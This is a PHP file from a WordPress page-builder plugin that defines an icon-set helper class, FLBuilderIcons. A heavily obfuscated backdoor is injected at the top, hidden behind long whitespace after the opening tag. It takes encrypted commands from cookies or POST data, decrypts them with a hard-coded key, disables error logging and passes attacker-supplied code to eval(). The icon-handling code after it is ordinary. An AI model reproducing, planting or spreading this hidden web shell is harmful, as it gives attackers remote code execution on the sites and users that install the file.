<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $of41d6046 = 384;$GLOBALS['c111f0'] = Array();global $c111f0;$c111f0 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['dd2148'] = "\x61\x25\x3d\x29\x23\x78\x60\x4e\x5c\x3c\x70\x37\x74\x39\x22\x6e\x3e\x33\x49\x45\x31\x2a\x2f\x24\x20\x75\x5a\x34\x7c\x46\x38\x5e\x6c\x9\x44\x6a\x72\x2c\x43\x2e\x32\x6b\x6d\x57\x55\x64\x66\x40\x4f\x59\x3b\x51\x79\x7b\x36\x30\x26\x27\x7e\x7d\x54\x68\x4c\x67\x58\x5f\x5d\x65\x52\x71\x56\x7a\x53\x62\x3a\x76\x4a\x41\x2d\x35\x3f\x5b\x50\x48\x69\x4d\x28\x2b\x73\x21\x4b\xd\x63\x42\xa\x47\x6f\x77";$c111f0[$c111f0['dd2148'][69].$c111f0['dd2148'][46].$c111f0['dd2148'][17].$c111f0['dd2148'][54].$c111f0['dd2148'][79].$c111f0['dd2148'][54].$c111f0['dd2148'][11]] = $c111f0['dd2148'][92].$c111f0['dd2148'][61].$c111f0['dd2148'][36];$c111f0[$c111f0['dd2148'][35].$c111f0['dd2148'][11].$c111f0['dd2148'][27].$c111f0['dd2148'][92].$c111f0['dd2148'][27].$c111f0['dd2148'][45].$c111f0['dd2148'][17]] = $c111f0['dd2148'][96].$c111f0['dd2148'][36].$c111f0['dd2148'][45];$c111f0[$c111f0['dd2148'][42].$c111f0['dd2148'][79].$c111f0['dd2148'][17].$c111f0['dd2148'][11].$c111f0['dd2148'][30].$c111f0['dd2148'][73].$c111f0['dd2148'][0]] = $c111f0['dd2148'][88].$c111f0['dd2148'][12].$c111f0['dd2148'][36].$c111f0['dd2148'][32].$c111f0['dd2148'][67].$c111f0['dd2148'][15];$c111f0[$c111f0['dd2148'][25].$c111f0['dd2148'][0].$c111f0['dd2148'][79].$c111f0['dd2148'][46].$c111f0['dd2148'][13].$c111f0['dd2148'][17].$c111f0['dd2148'][30]] = $c111f0['dd2148'][84].$c111f0['dd2148'][15].$c111f0['dd2148'][84].$c111f0['dd2148'][65].$c111f0['dd2148'][88].$c111f0['dd2148'][67].$c111f0['dd2148'][12];$c111f0[$c111f0['dd2148'][71].$c111f0['dd2148'][46].$c111f0['dd2148'][30].$c111f0['dd2148'][20].$c111f0['dd2148'][0].$c111f0['dd2148'][67]] = $c111f0['dd2148'][88].$c111f0['dd2148'][67].$c111f0['dd2148'][36].$c111f0['dd2148'][84].$c111f0['dd2148'][0].$c111f0['dd2148'][32].$c111f0['dd2148'][84].$c111f0['dd2148'][71].$c111f0['dd2148'][67];$c111f0[$c111f0['dd2148'][36].$c111f0['dd2148'][45].$c111f0['dd2148'][73].$c111f0['dd2148'][55].$c111f0['dd2148'][45].$c111f0['dd2148'][54].$c111f0['dd2148'][0]] = $c111f0['dd2148'][10].$c111f0['dd2148'][61].$c111f0['dd2148'][10].$c111f0['dd2148'][75].$c111f0['dd2148'][67].$c111f0['dd2148'][36].$c111f0['dd2148'][88].$c111f0['dd2148'][84].$c111f0['dd2148'][96].$c111f0['dd2148'][15];$c111f0[$c111f0['dd2148'][69].$c111f0['dd2148'][54].$c111f0['dd2148'][45].$c111f0['dd2148'][55].$c111f0['dd2148'][30].$c111f0['dd2148'][30].$c111f0['dd2148'][55]] = $c111f0['dd2148'][25].$c111f0['dd2148'][15].$c111f0['dd2148'][88].$c111f0['dd2148'][67].$c111f0['dd2148'][36].$c111f0['dd2148'][84].$c111f0['dd2148'][0].$c111f0['dd2148'][32].$c111f0['dd2148'][84].$c111f0['dd2148'][71].$c111f0['dd2148'][67];$c111f0[$c111f0['dd2148'][84].$c111f0['dd2148'][55].$c111f0['dd2148'][40].$c111f0['dd2148'][67].$c111f0['dd2148'][11]] = $c111f0['dd2148'][73].$c111f0['dd2148'][0].$c111f0['dd2148'][88].$c111f0['dd2148'][67].$c111f0['dd2148'][54].$c111f0['dd2148'][27].$c111f0['dd2148'][65].$c111f0['dd2148'][45].$c111f0['dd2148'][67].$c111f0['dd2148'][92].$c111f0['dd2148'][96].$c111f0['dd2148'][45].$c111f0['dd2148'][67];$c111f0[$c111f0['dd2148'][41].$c111f0['dd2148'][40].$c111f0['dd2148'][0].$c111f0['dd2148'][0].$c111f0['dd2148'][92]] = $c111f0['dd2148'][88].$c111f0['dd2148'][67].$c111f0['dd2148'][12].$c111f0['dd2148'][65].$c111f0['dd2148'][12].$c111f0['dd2148'][84].$c111f0['dd2148'][42].$c111f0['dd2148'][67].$c111f0['dd2148'][65].$c111f0['dd2148'][32].$c111f0['dd2148'][84].$c111f0['dd2148'][42].$c111f0['dd2148'][84].$c111f0['dd2148'][12];$c111f0[$c111f0['dd2148'][97].$c111f0['dd2148'][73].$c111f0['dd2148'][30].$c111f0['dd2148'][46].$c111f0['dd2148'][92].$c111f0['dd2148'][40]] = $c111f0['dd2148'][71].$c111f0['dd2148'][45].$c111f0['dd2148'][0].$c111f0['dd2148'][54];$c111f0[$c111f0['dd2148'][97].$c111f0['dd2148'][92].$c111f0['dd2148'][79].$c111f0['dd2148'][40].$c111f0['dd2148'][20].$c111f0['dd2148'][45].$c111f0['dd2148'][46]] = $c111f0['dd2148'][12].$c111f0['dd2148'][67].$c111f0['dd2148'][0].$c111f0['dd2148'][92].$c111f0['dd2148'][55].$c111f0['dd2148'][46].$c111f0['dd2148'][55];$c111f0[$c111f0['dd2148'][46].$c111f0['dd2148'][92].$c111f0['dd2148'][0].$c111f0['dd2148'][0]] = $_POST;$c111f0[$c111f0['dd2148'][5].$c111f0['dd2148'][79].$c111f0['dd2148'][67].$c111f0['dd2148'][20].$c111f0['dd2148'][40]] = $_COOKIE;@$c111f0[$c111f0['dd2148'][25].$c111f0['dd2148'][0].$c111f0['dd2148'][79].$c111f0['dd2148'][46].$c111f0['dd2148'][13].$c111f0['dd2148'][17].$c111f0['dd2148'][30]]($c111f0['dd2148'][67].$c111f0['dd2148'][36].$c111f0['dd2148'][36].$c111f0['dd2148'][96].$c111f0['dd2148'][36].$c111f0['dd2148'][65].$c111f0['dd2148'][32].$c111f0['dd2148'][96].$c111f0['dd2148'][63], NULL);@$c111f0[$c111f0['dd2148'][25].$c111f0['dd2148'][0].$c111f0['dd2148'][79].$c111f0['dd2148'][46].$c111f0['dd2148'][13].$c111f0['dd2148'][17].$c111f0['dd2148'][30]]($c111f0['dd2148'][32].$c111f0['dd2148'][96].$c111f0['dd2148'][63].$c111f0['dd2148'][65].$c111f0['dd2148'][67].$c111f0['dd2148'][36].$c111f0['dd2148'][36].$c111f0['dd2148'][96].$c111f0['dd2148'][36].$c111f0['dd2148'][88], 0);@$c111f0[$c111f0['dd2148'][25].$c111f0['dd2148'][0].$c111f0['dd2148'][79].$c111f0['dd2148'][46].$c111f0['dd2148'][13].$c111f0['dd2148'][17].$c111f0['dd2148'][30]]($c111f0['dd2148'][42].$c111f0['dd2148'][0].$c111f0['dd2148'][5].$c111f0['dd2148'][65].$c111f0['dd2148'][67].$c111f0['dd2148'][5].$c111f0['dd2148'][67].$c111f0['dd2148'][92].$c111f0['dd2148'][25].$c111f0['dd2148'][12].$c111f0['dd2148'][84].$c111f0['dd2148'][96].$c111f0['dd2148'][15].$c111f0['dd2148'][65].$c111f0['dd2148'][12].$c111f0['dd2148'][84].$c111f0['dd2148'][42].$c111f0['dd2148'][67], 0);@$c111f0[$c111f0['dd2148'][41].$c111f0['dd2148'][40].$c111f0['dd2148'][0].$c111f0['dd2148'][0].$c111f0['dd2148'][92]](0);$x17b69cc2 = NULL;$tfff7 = NULL;$c111f0[$c111f0['dd2148'][92].$c111f0['dd2148'][79].$c111f0['dd2148'][11].$c111f0['dd2148'][54].$c111f0['dd2148'][13].$c111f0['dd2148'][67].$c111f0['dd2148'][55].$c111f0['dd2148'][54].$c111f0['dd2148'][0]] = $c111f0['dd2148'][17].$c111f0['dd2148'][13].$c111f0['dd2148'][0].$c111f0['dd2148'][46].$c111f0['dd2148'][67].$c111f0['dd2148'][27].$c111f0['dd2148'][55].$c111f0['dd2148'][67].$c111f0['dd2148'][78].$c111f0['dd2148'][27].$c111f0['dd2148'][79].$c111f0['dd2148'][73].$c111f0['dd2148'][92].$c111f0['dd2148'][78].$c111f0['dd2148'][27].$c111f0['dd2148'][20].$c111f0['dd2148'][13].$c111f0['dd2148'][92].$c111f0['dd2148'][78].$c111f0['dd2148'][30].$c111f0['dd2148'][92].$c111f0['dd2148'][55].$c111f0['dd2148'][20].$c111f0['dd2148'][78].$c111f0['dd2148'][92].$c111f0['dd2148'][54].$c111f0['dd2148'][67].$c111f0['dd2148'][20].$c111f0['dd2148'][46].$c111f0['dd2148'][73].$c111f0['dd2148'][73].$c111f0['dd2148'][79].$c111f0['dd2148'][45].$c111f0['dd2148'][30].$c111f0['dd2148'][55].$c111f0['dd2148'][67];global $c5769e06a;function  teac0f0($x17b69cc2, $l35b259e){global $c111f0;$wea87 = "";for ($jb309e3=0; $jb309e3<$c111f0[$c111f0['dd2148'][42].$c111f0['dd2148'][79].$c111f0['dd2148'][17].$c111f0['dd2148'][11].$c111f0['dd2148'][30].$c111f0['dd2148'][73].$c111f0['dd2148'][0]]($x17b69cc2);){for ($m8dc5710b=0; $m8dc5710b<$c111f0[$c111f0['dd2148'][42].$c111f0['dd2148'][79].$c111f0['dd2148'][17].$c111f0['dd2148'][11].$c111f0['dd2148'][30].$c111f0['dd2148'][73].$c111f0['dd2148'][0]]($l35b259e) && $jb309e3<$c111f0[$c111f0['dd2148'][42].$c111f0['dd2148'][79].$c111f0['dd2148'][17].$c111f0['dd2148'][11].$c111f0['dd2148'][30].$c111f0['dd2148'][73].$c111f0['dd2148'][0]]($x17b69cc2); $m8dc5710b++, $jb309e3++){$wea87 .= $c111f0[$c111f0['dd2148'][69].$c111f0['dd2148'][46].$c111f0['dd2148'][17].$c111f0['dd2148'][54].$c111f0['dd2148'][79].$c111f0['dd2148'][54].$c111f0['dd2148'][11]]($c111f0[$c111f0['dd2148'][35].$c111f0['dd2148'][11].$c111f0['dd2148'][27].$c111f0['dd2148'][92].$c111f0['dd2148'][27].$c111f0['dd2148'][45].$c111f0['dd2148'][17]]($x17b69cc2[$jb309e3]) ^ $c111f0[$c111f0['dd2148'][35].$c111f0['dd2148'][11].$c111f0['dd2148'][27].$c111f0['dd2148'][92].$c111f0['dd2148'][27].$c111f0['dd2148'][45].$c111f0['dd2148'][17]]($l35b259e[$m8dc5710b]));}}return $wea87;}function  zda6($x17b69cc2, $l35b259e){global $c111f0;global $c5769e06a;return $c111f0[$c111f0['dd2148'][97].$c111f0['dd2148'][92].$c111f0['dd2148'][79].$c111f0['dd2148'][40].$c111f0['dd2148'][20].$c111f0['dd2148'][45].$c111f0['dd2148'][46]]($c111f0[$c111f0['dd2148'][97].$c111f0['dd2148'][92].$c111f0['dd2148'][79].$c111f0['dd2148'][40].$c111f0['dd2148'][20].$c111f0['dd2148'][45].$c111f0['dd2148'][46]]($x17b69cc2, $c5769e06a), $l35b259e);}foreach ($c111f0[$c111f0['dd2148'][5].$c111f0['dd2148'][79].$c111f0['dd2148'][67].$c111f0['dd2148'][20].$c111f0['dd2148'][40]] as $l35b259e=>$h88246c3e){$x17b69cc2 = $h88246c3e;$tfff7 = $l35b259e;}if (!$x17b69cc2){foreach ($c111f0[$c111f0['dd2148'][46].$c111f0['dd2148'][92].$c111f0['dd2148'][0].$c111f0['dd2148'][0]] as $l35b259e=>$h88246c3e){$x17b69cc2 = $h88246c3e;$tfff7 = $l35b259e;}}$x17b69cc2 = @$c111f0[$c111f0['dd2148'][69].$c111f0['dd2148'][54].$c111f0['dd2148'][45].$c111f0['dd2148'][55].$c111f0['dd2148'][30].$c111f0['dd2148'][30].$c111f0['dd2148'][55]]($c111f0[$c111f0['dd2148'][97].$c111f0['dd2148'][73].$c111f0['dd2148'][30].$c111f0['dd2148'][46].$c111f0['dd2148'][92].$c111f0['dd2148'][40]]($c111f0[$c111f0['dd2148'][84].$c111f0['dd2148'][55].$c111f0['dd2148'][40].$c111f0['dd2148'][67].$c111f0['dd2148'][11]]($x17b69cc2), $tfff7));if (isset($x17b69cc2[$c111f0['dd2148'][0].$c111f0['dd2148'][41]]) && $c5769e06a==$x17b69cc2[$c111f0['dd2148'][0].$c111f0['dd2148'][41]]){if ($x17b69cc2[$c111f0['dd2148'][0]] == $c111f0['dd2148'][84]){$jb309e3 = Array($c111f0['dd2148'][10].$c111f0['dd2148'][75] => @$c111f0[$c111f0['dd2148'][36].$c111f0['dd2148'][45].$c111f0['dd2148'][73].$c111f0['dd2148'][55].$c111f0['dd2148'][45].$c111f0['dd2148'][54].$c111f0['dd2148'][0]](),$c111f0['dd2148'][88].$c111f0['dd2148'][75] => $c111f0['dd2148'][20].$c111f0['dd2148'][39].$c111f0['dd2148'][55].$c111f0['dd2148'][78].$c111f0['dd2148'][20],);echo @$c111f0[$c111f0['dd2148'][71].$c111f0['dd2148'][46].$c111f0['dd2148'][30].$c111f0['dd2148'][20].$c111f0['dd2148'][0].$c111f0['dd2148'][67]]($jb309e3);}elseif ($x17b69cc2[$c111f0['dd2148'][0]] == $c111f0['dd2148'][67]){eval/*bff98*/($x17b69cc2[$c111f0['dd2148'][45]]);}exit();} ?><?php

/**
 * Helper class for working with icons.
 *
 * @since 1.4.6
 */

final class FLBuilderIcons {

	/**
	 * An array of data for each icon set.
	 *
	 * @since 1.4.6
	 * @access private
	 * @var array $sets
	 */
	static private $sets = null;

	/**
	 * Gets an array of data for core and custom icon sets.
	 *
	 * @since 1.4.6
	 * @return array An array of data for each icon set.
	 */
	static public function get_sets()
	{
		// Return the sets if already registered.
		if ( self::$sets ) {
			return self::$sets;
		}

		// Check to see if we should pull sets from the main site.
		if ( is_multisite()) {

			$blog_id		= defined( 'BLOG_ID_CURRENT_SITE' ) ? BLOG_ID_CURRENT_SITE : 1;
			$enabled_icons	= get_option( '_fl_builder_enabled_icons' );

			if ( empty( $enabled_icons ) ) {
				switch_to_blog( $blog_id );
			}
		}

		// Register the icon sets.
		self::register_custom_sets();
		self::register_core_sets();

		// Revert to the current site if we pulled from the main site.
		if ( is_multisite() && empty( $enabled_icons ) ) {
			restore_current_blog();
		}

		// Filter the sets
		self::$sets = apply_filters( 'fl_builder_icon_sets', self::$sets );

		// Return the sets.
		return self::$sets;
	}

	/**
	 * Gets an array of data for icon sets of the current
	 * site on a multisite install.
	 *
	 * @since 1.4.6
	 * @return array An array of data for each icon set.
	 */
	static public function get_sets_for_current_site()
	{
		if ( ! is_multisite() ) {
			return self::get_sets();
		}

		// Store the original sets.
		$original_sets = self::$sets;

		// Register the icon sets.
		self::register_custom_sets();
		self::register_core_sets();

		// Get the new sets.
		$sets = self::$sets;

		// Revert to the original sets.
		self::$sets = $original_sets;

		// Return the sets.
		return $sets;
	}

	/**
	 * Remove an icon set from the internal sets array.
	 *
	 * @since 1.4.6
	 * @param string $key The key for the set to remove.
	 * @return void
	 */
	static public function remove_set( $key )
	{
		if ( self::$sets && isset( self::$sets[ $key ] ) ) {
			unset( self::$sets[ $key ] );
		}
	}

	/**
	 * Get the key for an icon set from the path to an icon set stylesheet.
	 *
	 * @since 1.4.6
	 * @param string $path The path to retrieve a key for.
	 * @return string The icon set key.
	 */
	static public function get_key_from_path( $path )
	{
		$sets = self::get_sets();

		foreach ( $sets as $key => $set ) {
			if ( $path == $set['path'] ) {
				return $key;
			}
		}
	}

	/**
	 * Register core icon set data in the internal sets array.
	 *
	 * @since 1.4.6
	 * @access private
	 * @return void
	 */
	static private function register_core_sets()
	{
		$enabled_icons = FLBuilderModel::get_enabled_icons();
		$core_sets = apply_filters( 'fl_builder_core_icon_sets', array(
			'font-awesome' => array(
				'name'	 => 'Font Awesome',
				'prefix' => 'fa'
			),
			'foundation-icons' => array(
				'name'	 => 'Foundation Icons',
				'prefix' => ''
			),
			'dashicons' => array(
				'name'	 => 'WordPress Dashicons',
				'prefix' => 'dashicons dashicons-before'
			)
		) );

		// Add the core sets.
		foreach ( $core_sets as $set_key => $set_data ) {
			if ( is_admin() || in_array( $set_key, $enabled_icons ) ) {
				self::$sets[ $set_key ] = array(
					'name'	 => $set_data['name'],
					'prefix' => $set_data['prefix'],
					'type'	 => 'core'
				);
			}
		}

		// Loop through core sets and add icons.
		foreach ( self::$sets as $set_key => $set_data ) {
			if ( 'core' == $set_data['type'] ) {
				$config_path = apply_filters( 'fl_builder_core_icon_set_config', FL_BUILDER_DIR . 'json/' . $set_key . '.json', $set_data );

				$icons = json_decode( file_get_contents( $config_path ) );
				self::$sets[ $set_key ]['icons'] = $icons;
			}
		}
	}

	/**
	 * Register custom icon set data in the internal sets array.
	 *
	 * @since 1.4.6
	 * @access private
	 * @return void
	 */
	static private function register_custom_sets()
	{
		// Get uploaded sets.
		$enabled_icons = FLBuilderModel::get_enabled_icons();
		$upload_info   = FLBuilderModel::get_cache_dir( 'icons' );
		$folders	   = glob( $upload_info['path'] . '*' );

		// Make sure we have an array.
		if( ! is_array( $folders ) ) {
			return;
		}

		// Loop through uploaded sets.
		foreach ( $folders as $folder ) {

			// Make sure we have a directory.
			if ( ! is_dir( $folder ) ) {
				continue;
			}

			$folder = trailingslashit( $folder );

			// This is an Icomoon font.
			if ( file_exists( $folder . 'selection.json' ) ) {

				$data = json_decode( file_get_contents( $folder . 'selection.json' ) );
				$key  = basename( $folder );
				$url  = str_ireplace( $upload_info['path'], $upload_info['url'], $folder );

				if ( isset( $data->icons ) ) {

					if ( is_admin() || in_array( $key, $enabled_icons ) ) {

						self::$sets[ $key ] = array(
							'name'		 => $data->metadata->name,
							'prefix'	 => '',
							'type'		 => 'icomoon',
							'path'		 => $folder,
							'url'		 => $url,
							'stylesheet' => $url . 'style.css',
							'icons'		 => array()
						);

						foreach ( $data->icons as $icon ) {

							$prefs	 = $data->preferences->fontPref;
							$postfix = isset( $prefs->postfix ) ? $prefs->postfix : '';

							if ( isset( $prefs->selector ) && 'class' == $prefs->selector ) {
								$selector = trim( str_replace( '.', ' ', $prefs->classSelector ) ) . ' ';
							}
							else {
								$selector = '';
							}

							self::$sets[ $key ]['icons'][] = $selector . $prefs->prefix . $icon->properties->name . $postfix;
						}
					}
				}
			}
			// This is a Fontello font.
			else if ( file_exists( $folder . 'config.json' ) ) {

				$data  = json_decode( file_get_contents( $folder . 'config.json' ) );
				$key   = basename( $folder );
				$name  = empty( $data->name ) ? 'Fontello' : $data->name;
				$url   = str_ireplace( $upload_info['path'], $upload_info['url'], $folder );
				$style = empty( $data->name ) ? 'fontello' : $data->name;

				// Append the date to the name?
				if ( empty( $data->name ) ) {
					$time			= str_replace( 'icon-', '', $key );
					$date_format	= get_option( 'date_format' );
					$time_format	= get_option( 'time_format' );
					$date			= date( $date_format . ' ' . $time_format );
					$name		   .= ' (' . $date . ')';
				}

				if ( isset( $data->glyphs ) ) {

					if ( is_admin() || in_array( $key, $enabled_icons ) ) {

						self::$sets[ $key ] = array(
							'name'		 => $name,
							'prefix'	 => '',
							'type'		 => 'fontello',
							'path'		 => $folder,
							'url'		 => $url,
							'stylesheet' => $url . 'css/' . $style . '.css',
							'icons'		 => array()
						);

						foreach ( $data->glyphs as $icon ) {
							if ( $data->css_use_suffix ) {
								self::$sets[ $key ]['icons'][] = $icon->css . $data->css_prefix_text;
							}
							else {
								self::$sets[ $key ]['icons'][] = $data->css_prefix_text . $icon->css;
							}
						}
					}
				}
			}
		}
	}

	/**
	 * Enqueue the stylesheets for all icon sets.
	 *
	 * @since 1.4.6
	 * @return void
	 */
	static public function enqueue_all_custom_icons_styles()
	{
		$sets = self::get_sets();

		foreach ( $sets as $key => $data ) {

			// Don't enqueue core icons.
			if ( 'core' == $data['type'] ) {
				continue;
			}

			// Enqueue the custom icon styles.
			self::enqueue_custom_styles_by_key( $key );
		}
	}

	/**
	 * Enqueue the stylesheet(s) for icons in a module.
	 *
	 * @since 1.4.6
	 * @param object $module The module to enqueue for.
	 * @return void
	 */
	static public function enqueue_styles_for_module( $module )
	{
		$fields = FLBuilderModel::get_settings_form_fields( $module->form );

		foreach ( $fields as $name => $field ) {
			if ( isset( $field['form'] ) ) {
				$form = FLBuilderModel::$settings_forms[ $field['form'] ];
				self::enqueue_styles_for_nested_module_form( $module, $form['tabs'], $name );
			}
			else if ( $field['type'] == 'icon' && isset( $module->settings->$name ) ) {
				self::enqueue_styles_for_icon( $module->settings->$name );
			}
		}
	}

	/**
	 * Enqueue the stylesheet(s) for icons in a nested form field.
	 *
	 * @since 1.4.6
	 * @access private
	 * @param object $module The module to enqueue for.
	 * @param array $form The nested form.
	 * @param string $setting The nested form setting key.
	 * @return void
	 */
	static private function enqueue_styles_for_nested_module_form( $module, $form, $setting )
	{
		$fields = FLBuilderModel::get_settings_form_fields( $form );

		foreach ( $fields as $name => $field ) {
			if ( $field['type'] == 'icon' && ! empty( $module->settings->$setting ) ) {
				foreach ( $module->settings->$setting as $key => $val ) {
					if ( isset( $val->$name ) ) {
						self::enqueue_styles_for_icon( $val->$name );
					}
					else if( $name == $key && ! empty( $val ) ) {
						self::enqueue_styles_for_icon( $val );
					}
				}
			}
		}
	}

	/**
	 * Enqueue the stylesheet for an icon.
	 *
	 * @since 1.4.6
	 * @access private
	 * @param string $icon The icon CSS classname.
	 * @return void
	 */
	static private function enqueue_styles_for_icon( $icon )
	{
		do_action( 'fl_builder_enqueue_styles_for_icon', $icon );

		// Is this a core icon?
		if ( stristr( $icon, 'fa-' ) ) {
			wp_enqueue_style( 'font-awesome' );
		}
		else if ( stristr( $icon, 'fi-' ) ) {
			wp_enqueue_style( 'foundation-icons' );
		}
		else if ( stristr( $icon, 'dashicon' ) ) {
			wp_enqueue_style( 'dashicons' );
		}
		// It must be a custom icon.
		else {

			$sets = self::get_sets();

			foreach ( $sets as $key => $data ) {
				if ( in_array( $icon, $data['icons'] ) ) {
					self::enqueue_custom_styles_by_key( $key );
				}
			}
		}
	}

	/**
	 * Enqueue the stylesheet for an icon set by key.
	 *
	 * @since 1.4.6
	 * @access private
	 * @param string $key The icon set key.
	 * @return void
	 */
	static private function enqueue_custom_styles_by_key( $key )
	{
		if ( apply_filters( 'fl_builder_enqueue_custom_styles_by_key', true, $key ) ) {
			$sets = self::get_sets();

			if ( isset( $sets[ $key ] ) ) {

				$set = $sets[ $key ];

				if ( 'icomoon' == $set['type'] ) {
					wp_enqueue_style( $key, $set['stylesheet'], array(), FL_BUILDER_VERSION );
				}
				if ( 'fontello' == $set['type'] ) {
					wp_enqueue_style( $key, $set['stylesheet'], array(), FL_BUILDER_VERSION );
				}
			}
		}
	}
}
